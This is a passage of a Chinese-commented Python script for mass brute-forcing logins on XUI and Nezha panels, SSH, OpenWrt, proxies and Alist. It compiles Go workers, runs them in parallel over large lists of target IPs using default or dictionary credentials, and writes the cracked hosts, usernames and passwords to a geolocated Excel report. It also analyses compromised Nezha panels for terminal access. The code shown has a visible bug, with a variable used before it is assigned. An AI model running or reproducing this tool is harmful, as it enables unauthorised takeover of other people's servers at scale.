        except requests.exceptions.RequestException:
            continue
    return result_line, (0, 0, "登录或分析失败")

# =========================== 主脚本优化部分 ===========================
GO_EXEC = "/usr/local/go/bin/go"

def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
    if not os.path.exists(xlsx_file): return
    try:
        # xlsxwriter can't modify files, so we can't update.
        # This function is now a placeholder. The analysis data should be
        # integrated during the initial Excel creation.
        print(f"ℹ️  {Fore.CYAN}哪吒分析数据已在生成时写入Excel。{Style.RESET_ALL}")
    except Exception as e:
        print(f"❌ {Fore.RED}更新Excel文件时发生错误: {e}{Style.RESET_ALL}")

def input_with_default(prompt, default):
    user_input = input(f"{prompt} (默认: {default})：").strip()
    return int(user_input) if user_input.isdigit() else default

def input_filename_with_default(prompt, default):
    user_input = input(f"{prompt} (默认: {default})：").strip()
    return user_input if user_input else default

def escape_go_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')

def generate_go_code(go_file_name, template_lines, **kwargs):
    code = "\n".join(template_lines)
    kwargs.setdefault('timeout', 3)
    kwargs.setdefault('semaphore_size', 100)
    # For brute-force templates, enable KeepAlive by default
    kwargs.setdefault('disable_keepalive', 'false' if TEMPLATE_MODE in [1, 2, 8] else 'true')

    for key, value in kwargs.items():
        placeholder = f"{{{key}}}"
        if placeholder in code:
            code = code.replace(placeholder, str(value))

    if '{user_list}' in code:
        user_list_str = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in kwargs.get('usernames', [])]) + "}"
        code = code.replace("{user_list}", user_list_str)
    if '{pass_list}' in code:
        pass_list_str = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in kwargs.get('passwords', [])]) + "}"
        code = code.replace("{pass_list}", pass_list_str)
    if '{creds_list}' in code:
        creds_list_str = "[]string{" + ", ".join([f'"{escape_go_string(c)}"' for c in kwargs.get('credentials', [])]) + "}"
        code = code.replace("{creds_list}", creds_list_str)

    with open(go_file_name, 'w', encoding='utf-8') as f:
        f.write(code)

def compile_go_program(go_file, executable_name):
    executable_path = os.path.abspath(executable_name)
    if sys.platform == "win32":
        executable_path += ".exe"

    print(f"📦 [编译] 正在编译Go程序 {go_file} -> {executable_path}...")
    go_env = os.environ.copy()
    go_env['GOGC'] = '500' # Use more memory for less GC pauses
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'

    try:
        cmd = [GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable_path, go_file]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True, env=go_env)
        if result.stderr:
            print(f"   - ⚠️  {Fore.YELLOW}Go编译器警告: {result.stderr}{Style.RESET_ALL}")
        print(f"✅ [编译] Go程序编译成功: {executable_path}")
        return executable_path
    except subprocess.CalledProcessError as e:
        print(f"❌ {Fore.RED}[编译] Go程序 {go_file} 编译失败!{Style.RESET_ALL}")
        print(f"   - 返回码: {e.returncode}")
        print(f"   - 错误输出:\n{e.stderr}")
        print("   - 请检查Go环境和代码。")
        return None

def tune_system():
    if platform.system() == "Linux":
        print("🐧 [系统] 正在尝试进行Linux系统优化...")
        # 1. 提升文件描述符限制
        if resource:
            try:
                soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
                if soft < 65536:
                    resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))
                    print(f"✅ [系统] 文件描述符限制已提升至 65536。")
            except (ValueError, OSError) as e:
                print(f"⚠️  {Fore.YELLOW}[系统] 提升文件描述符限制失败: {e}。建议使用root权限运行。{Style.RESET_ALL}")
        # 2. 提示内核TCP参数调优
        print(f"ℹ️  {Fore.CYAN}[系统] 为获得最佳性能，建议以root身份运行以下命令: {Style.RESET_ALL}")
        print(f"{Fore.YELLOW}sysctl -w net.core.somaxconn=65535")
        print(f"sysctl -w net.ipv4.tcp_tw_reuse=1")
        print(f"sysctl -w net.ipv4.tcp_fin_timeout=30{Style.RESET_ALL}")

# ==================== 全新执行模型 (管道/多进程) ====================
def process_chunk(executable_path, lines, go_timeout):
    """
    处理单个IP块的函数，由ProcessPoolExecutor调用。
    通过stdin/stdout与Go子进程通信。
    """
    input_data = "\n".join(lines).encode('utf-8')
    # 动态计算总超时：每个IP的超时时间 * IP数量 + 60秒的额外缓冲
    total_timeout = (go_timeout * len(lines)) + 60

    try:
        proc = subprocess.run(
            [executable_path],
            input=input_data,
            capture_output=True,
            timeout=total_timeout,
            check=False # 不检查返回码，手动处理
        )
        if proc.returncode != 0:
            # 137 is often OOM killer
            if proc.returncode == 137:
                 return (False, f"Go进程被系统终止(OOM Killed)。错误: {proc.stderr.decode('utf-8', 'ignore')}")
            return (False, f"Go进程异常退出，返回码 {proc.returncode}。错误: {proc.stderr.decode('utf-8', 'ignore')}")

        results = proc.stdout.decode('utf-8', 'ignore').strip().split('\n')
        # 过滤掉可能的空行
        return (True, [res for res in results if res])
    except subprocess.TimeoutExpired:
        return (False, "任务块处理超时，已被强制终止。")
    except Exception as e:
        return (False, f"执行任务块时发生未知Python异常: {e}")

def run_scan_in_parallel(lines, executable_path, python_concurrency, go_internal_concurrency, chunk_size, go_timeout, final_output_file):
    if not lines: return
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    print(f"ℹ️  [扫描] 已将 {len(lines)} 个目标分为 {len(chunks)} 个任务块。")

    # 使用Manager创建可在进程间共享的锁
    manager = Manager()
    lock = manager.Lock()

    with ProcessPoolExecutor(max_workers=python_concurrency) as executor:
        futures = [executor.submit(process_chunk, executable_path, chunk, go_timeout) for chunk in chunks]
        with tqdm(total=len(chunks), desc=f"⚙️  [扫描] 并行处理中", ncols=100) as pbar:
            for future in as_completed(futures):
                try:
                    success, data = future.result()
                    if success and data:
                        with lock:
                            with open(final_output_file, 'a', encoding='utf-8') as f:
                                for line in data:
                                    f.write(line + '\n')
                    elif not success:
                        # 打印错误信息，但不中断整个扫描
                        print(f"\n❌ {Fore.RED}一个任务块失败: {data}{Style.RESET_ALL}")
                except Exception as exc:
                    print(f'\n❌ {Fore.RED}一个任务块执行时产生严重异常: {exc}{Style.RESET_ALL}')
                pbar.update(1)
    print("\n")

# ==================== 并行化IP信息查询及报告生成 ====================
def get_ip_info_batch(ip_list):
    """由子进程调用的函数，查询一小批IP信息。"""
    url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
    payload = [{"query": ip.split(':')[0]} for ip in ip_list]
    results = {ip: ['查询失败'] * 4 for ip in ip_list}
    try:
        response = requests.post(url, json=payload, timeout=20)
        response.raise_for_status()
        data = response.json()
        for item in data:
            original_ip_port = next((ip for ip in ip_list if ip.startswith(item.get('query', ''))), None)
            if original_ip_port and item.get('status') == 'success':
                results[original_ip_port] = [
                    item.get('country', 'N/A'),
                    item.get('regionName', 'N/A'),
                    item.get('city', 'N/A'),
                    item.get('isp', 'N/A')
                ]
    except requests.exceptions.RequestException:
        pass # 失败时返回默认的'查询失败'
    return results

def run_ipcx_and_generate_report(final_result_file, xlsx_output_file, nezha_analysis_data=None):
    if not os.path.exists(final_result_file) or os.path.getsize(final_result_file) == 0:
        return

    print(f"\n📊 [报告] 正在并行查询IP地理位置并生成Excel报告...")
    # 1. 流式读取所有结果
    with open(final_result_file, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if line.strip()]

    # 2. 解析并准备IP列表
    parsed_data = []
    ip_to_query = []
    for line in lines:
        parts = line.split()
        addr = parts[0] if parts else ''
        user = parts[1] if len(parts) > 1 else ''
        passwd = parts[2] if len(parts) > 2 else ''
        parsed_data.append({'line': line, 'addr': addr, 'user': user, 'passwd': passwd})
        ip_to_query.append(addr)

    # 3. 并行查询IP信息
    all_ip_info = {}
    chunk_size = 100 # ip-api.com batch limit
    ip_chunks = [ip_to_query[i:i + chunk_size] for i in range(0, len(ip_to_query), chunk_size)]

    with ProcessPoolExecutor() as executor:
        futures = [executor.submit(get_ip_info_batch, chunk) for chunk in ip_chunks]
        with tqdm(total=len(ip_chunks), desc="[📊] IP信息查询", unit="batch", ncols=100) as pbar:
            for i, future in enumerate(as_completed(futures)):
                all_ip_info.update(future.result())
                pbar.update(1)
                if i < len(ip_chunks) - 1:
                    time.sleep(1.5)

    # 4. 使用xlsxwriter生成Excel报告
    print("   - 正在写入Excel文件...")
    workbook = xlsxwriter.Workbook(xlsx_output_file)
    worksheet = workbook.add_worksheet("IP信息")
    header_format = workbook.add_format({'bold': True})
    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']
    if nezha_analysis_data:
        headers.extend(['服务器总数', '终端畅通数', '畅通服务器列表'])
    worksheet.write_row('A1', headers, header_format)

    # --- 全新的、健壮的写入和列宽计算逻辑 ---

    # 步骤 A: 将所有要写入的数据行聚合到一个列表中
    all_rows_data = []
    for item in parsed_data:
        ip_info = all_ip_info.get(item['addr'], ['N/A'] * 4)
        row_data = [item['line'], item['addr'], item['user'], item['passwd']] + ip_info
        if nezha_analysis_data:
            analysis = nezha_analysis_data.get(item['line'], ('N/A', 'N/A', 'N/A'))
            # 确保分析结果是字符串以便计算长度
            row_data.extend(map(str, analysis))
        all_rows_data.append(row_data)

    # 步骤 B: 将聚合好的数据写入工作表
    for row_num, row_data in enumerate(all_rows_data, 1):  # 从第2行开始写 (索引1)
        worksheet.write_row(row_num, 0, row_data)

    # 步骤 C: 根据实际写入的数据计算并设置列宽
    for col_num, header in enumerate(headers):
        # 提取该列的所有数据（包括表头），并转换为字符串
        column_data = [str(header)] + [str(row[col_num]) for row in all_rows_data]
        # 计算该列中最长字符串的长度
        max_len = max(len(cell) for cell in column_data)
        # 设置列宽，并增加一点余量
        worksheet.set_column(col_num, col_num, max_len + 2)

    workbook.close()
    print(f"✅ [报告] Excel报告已生成: {xlsx_output_file}")
def clean_temp_files():
    print("🗑️  [清理] 正在删除临时文件...")
    # 由于不再使用临时目录，主要清理Go相关文件
    temp_files = [
        'xui.go', 'subnet_scanner.go', 'go.mod', 'go.sum',
        'xui_executable', 'xui_executable.exe',
        'subnet_scanner_executable', 'subnet_scanner_executable.exe',
    ]
    for f in temp_files:
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError:
                pass
    print("✅ [清理] 清理完成。")

def choose_template_mode():
    print("请选择爆破模式：")
    print("1. XUI面板")
    print("2. 哪吒面板")
    print("3. SSH")
    print("4. Sub Store")
    print("5. OpenWrt/iStoreOS")
    print("--- 代理模式 ---")
    print("6. SOCKS5 代理")
    print("7. HTTP 代理")
    print("8. HTTPS 代理 (功能受限)")
    print("--- 其他面板 ---")
    print("9. Alist 面板")
    print("10. TCP 端口活性检测")
    while True:
        choice = input("输入 1-10 之间的数字 (默认: 1)：").strip()
        if choice in ("", "1"): return 1
        elif choice == "2": return 2
        elif choice == "3": return 6
        elif choice == "4": return 7
        elif choice == "5": return 8
        elif choice == "6": return 9   # SOCKS5
        elif choice == "7": return 10  # HTTP
        elif choice == "8":
            print(f"⚠️  {Fore.YELLOW}警告: fasthttp不支持HTTPS代理，此模式功能受限，可能无法工作。{Style.RESET_ALL}")
            return 11  # HTTPS
        elif choice == "9": return 12  # Alist
        elif choice == "10": return 13 # TCP Test
        else:
            print(f"❌ {Fore.RED}输入无效，请重新输入。{Style.RESET_ALL}")

def select_proxy_test_target():
    # ... (此函数内容未改变)
    print("\n--- 代理测试目标选择 ---")
    print("1: IPIP.net (IP验证, 推荐)")
    print("2: Google (全球, http)")
    print("3: Xiaomi (中国大陆稳定, http)")
    print("4: Baidu (中国大陆稳定, https)")
    print("5: 自定义URL")
    default_target = "http://myip.ipip.net"
    while True:
        choice_str = input("请选择一个测试目标 (默认: 1): ").strip()
        if choice_str == "" or choice_str == "1": return default_target
        try:
            choice = int(choice_str)
            if choice == 2: return "http://www.google.com/generate_204"
            elif choice == 3: return "http://connect.rom.miui.com/generate_204"
            elif choice == 4: return "https://www.baidu.com"
            elif choice == 5:
                custom_url = input("请输入自定义测试URL: ").strip()
                return custom_url if custom_url else default_target
            else: print("⚠️  无效选择，请重新输入。")
        except ValueError: print("⚠️  无效输入，请输入数字。")

def is_in_china():
    # ... (此函数内容未改变)
    print("    - 正在通过 ping google.com 检测网络环境...")
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "2", "google.com"], capture_output=True, check=False)
        if result.returncode == 0:
            print(f"    - 🌍 {Fore.GREEN}Ping 成功，判断为海外服务器。{Style.RESET_ALL}")
            return False
        else:
            print(f"    - 🇨🇳 {Fore.YELLOW}Ping 超时或失败，判断为国内服务器，将自动使用镜像。{Style.RESET_ALL}")
            return True
    except FileNotFoundError:
        print(f"    - ⚠️  {Fore.YELLOW}未找到 ping 命令，无法检测网络。将使用默认源。{Style.RESET_ALL}")
        return False

def check_environment(template_mode, is_china_env):
    print(">>> 正在检查依赖环境...")
    # 检查Go
    if not shutil.which(GO_EXEC):
        print(f"❌ {Fore.RED}错误: 未在 {GO_EXEC} 找到Go编译器。{Style.RESET_ALL}")
        print("请先安装Go 1.20+ 版本，或确保其在正确路径。")
        sys.exit(1)

    # 检查Go模块
    required_pkgs = ["github.com/valyala/fasthttp", "github.com/valyala/fasthttp/fasthttpproxy"]
    if template_mode == 6: required_pkgs.append("golang.org/x/crypto/ssh")
    if template_mode in [9, 10, 11]: required_pkgs.append("golang.org/x/net/proxy")

    print("    - 正在检查并安装必要的Go模块...")
    go_env['GOPATH'] = os.path.expanduser('~/go') # 设置GOPATH到用户主目录下的go文件夹
    go_env = os.environ.copy()
    if is_china_env: go_env['GOPROXY'] = 'https://goproxy.cn,direct'
    if not os.path.exists("go.mod"):
        subprocess.run([GO_EXEC, "mod", "init", "xui_scanner"], capture_output=True, env=go_env)

    for pkg in set(required_pkgs):
        try:
            subprocess.run([GO_EXEC, "get", pkg], check=True, capture_output=True, env=go_env)
        except subprocess.CalledProcessError as e:
            print(f"\n❌ {Fore.RED}Go模块 '{pkg}' 安装失败。请检查网络或代理设置。{Style.RESET_ALL}")
            print(e.stderr.decode())
            sys.exit(1)
    print(f"✅ {Fore.GREEN}所有Go模块均已就绪。{Style.RESET_ALL}")
    print(">>> ✅ 环境依赖检测完成 ✅ <<<\n")

def load_credentials(template_mode, auth_mode=0):
    # ... (此函数内容未改变, 但修复了逻辑)
    usernames, passwords, credentials = [], [], []
    if template_mode in [7, 12, 13]: return [], [], []
    if auth_mode == 1: return [], [], []
    if auth_mode == 2:
        if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
            print("❌ 错误: 缺少 username.txt 或 password.txt 文件。"); sys.exit(1)
        with open("username.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open("password.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        if not usernames or not passwords: print("❌ 错误: 用户名或密码文件为空。"); sys.exit(1)
        return usernames, passwords, []
    if auth_mode == 3:
        if not os.path.exists("credentials.txt"):
            print("❌ 错误: 缺少 credentials.txt 文件。"); sys.exit(1)
        with open("credentials.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            credentials = [line.strip() for line in f if line.strip() and ":" in line]
        if not credentials: print("❌ 错误: credentials.txt 文件为空或格式不正确。"); sys.exit(1)
        return [], [], credentials
    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
    if use_custom == 'y': return load_credentials(template_mode, auth_mode=2)
    if template_mode == 8: return ["root"], ["password"], []
    return ["admin"], ["admin"], []

def get_vps_info():
    # ... (此函数内容未改变)
    try:
        response = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10)
        data = response.json()
        return data.get('query', 'N/A'), data.get('country', 'N/A')
    except requests.exceptions.RequestException:
        return "N/A", "N/A"
if __name__ == "__main__":
    start = time.time()
    interrupted = False
    
    from datetime import datetime, timedelta, timezone
    beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
    time_str = beijing_time.strftime("%Y%m%d-%H%M")
    
    TEMPLATE_MODE = choose_template_mode()
    mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist", 13: "TCP-Active"}
    prefix = mode_map.get(TEMPLATE_MODE, "result")
    is_china_env = is_in_china()

    try:
        print("\n🚀 === 爆破一键启动 - 参数配置 === 🚀")
        tune_system()

        input_file = input_filename_with_default("📝 请输入源文件名", "1.txt")
        if not os.path.exists(input_file):
            print(f"❌ 错误: 文件 '{input_file}' 不存在。"); sys.exit(1)

        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            all_lines = [line.strip() for line in f if line.strip()]
        print(f"--- 📝 总计 {len(all_lines)} 个目标 ---")
        
        cpu_cores = os.cpu_count() or 1
        recommended_py_concurrency = cpu_cores
        recommended_go_concurrency = 200
        
        print("\n--- ⚙️  并发模型说明 ---")
        print("脚本将启动多个并行的扫描进程（Python控制），每个进程内部再使用多个协程（Go控制）进行扫描。")
        print("Python并发数建议设置为CPU核心数，Go并发数可以设置得更高。")

        python_concurrency = input_with_default("请输入Python并发任务数 (进程数)", recommended_py_concurrency)
        go_internal_concurrency = input_with_default("请输入每个任务内部的Go并发数 (协程数)", recommended_go_concurrency)
        chunk_size = input_with_default("请输入每个任务块处理的IP数量", 1000)
        go_timeout = input_with_default("请输入单个IP的超时时间(秒)", 5)
        
        params = {'semaphore_size': go_internal_concurrency, 'timeout': go_timeout}
        
        AUTH_MODE = 0
        if TEMPLATE_MODE in [9, 10, 11]:
            print("\n请选择代理凭据模式：\n1. 无凭据\n2. 独立字典 (username.txt, password.txt)\n3. 组合凭据 (credentials.txt, user:pass)")
            while True:
                auth_choice = input("输入 1, 2, 或 3 (默认: 1): ").strip()
                if auth_choice in ["", "1"]: AUTH_MODE = 1; break
                elif auth_choice == "2": AUTH_MODE = 2; break
                elif auth_choice == "3": AUTH_MODE = 3; break
                else: print("❌ 输入无效。")
            params['proxy_type'] = {9: "socks5", 10: "http", 11: "https"}.get(TEMPLATE_MODE)
            params['test_url'] = select_proxy_test_target()

        params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
        params['auth_mode'] = AUTH_MODE
        
        check_environment(TEMPLATE_MODE, is_china_env)

        template_map = {
            1: XUI_GO_TEMPLATE_1_LINES, 2: XUI_GO_TEMPLATE_2_LINES,
            6: XUI_GO_TEMPLATE_6_LINES, 7: XUI_GO_TEMPLATE_7_LINES,
            8: XUI_GO_TEMPLATE_8_LINES, 9: PROXY_GO_TEMPLATE_LINES,
            10: PROXY_GO_TEMPLATE_LINES, 11: PROXY_GO_TEMPLATE_LINES,
            12: ALIST_GO_TEMPLATE_LINES, 13: TCP_ACTIVE_GO_TEMPLATE_LINES,
        }
        template_lines = template_map.get(TEMPLATE_MODE)
        # --- 这是被修正的地方 ---
        if not template_lines:
            print(f"❌ {Fore.RED}错误: 模式 {TEMPLATE_MODE} 无效或未定义模板。{Style.RESET_ALL}")
            sys.exit(1)

        generate_go_code("xui.go", template_lines, **params)
        executable = compile_go_program("xui.go", "xui_executable")
        if not executable: 
            sys.exit(1)
        
        final_txt_file = f"{prefix}-{time_str}.txt"
        final_xlsx_file = f"{prefix}-{time_str}.xlsx"
        if os.path.exists(final_txt_file): 
            os.remove(final_txt_file)

        run_scan_in_parallel(all_lines, executable, python_concurrency, go_internal_concurrency, chunk_size, go_timeout, final_txt_file)
        
        nezha_analysis_data = None
        if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
            analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50)
            print(f"\n--- 🔍 [分析] 开始对成功的哪吒面板进行深度分析 (使用 {analysis_threads} 线程)... ---")
            with open(final_txt_file, 'r', encoding='utf-8') as f:
                results = [line.strip() for line in f if line.strip()]
            
            nezha_analysis_data = {}
            with ProcessPoolExecutor(max_workers=analysis_threads) as executor:
                futures = {executor.submit(analyze_panel, res): res for res in results}
                for future in tqdm(as_completed(futures), total=len(results), desc="[🔍] 分析哪吒面板"):
                    result_line = futures[future]
                    nezha_analysis_data[result_line] = future.result()[1]

        run_ipcx_and_generate_report(final_txt_file, final_xlsx_file, nezha_analysis_data)
        
    except KeyboardInterrupt:
        print("\n>>> 🛑 用户中断操作（Ctrl+C），准备清理...")
        interrupted = True
    except Exception as e:
        print(f"\n❌ {Fore.RED}发生意外的严重错误: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        interrupted = True
    finally:
        clean_temp_files()
        end = time.time()
        cost = int(end - start)
        run_time_str = f"{cost // 60} 分 {cost % 60} 秒"
        if interrupted:
            print(f"\n=== 🛑 脚本已被中断，中止前共运行 {run_time_str} ===")
        else:
            print(f"\n=== 🎉 全部完成！总用时 {run_time_str} ===")
        # Telegram upload logic can be added here if needed.
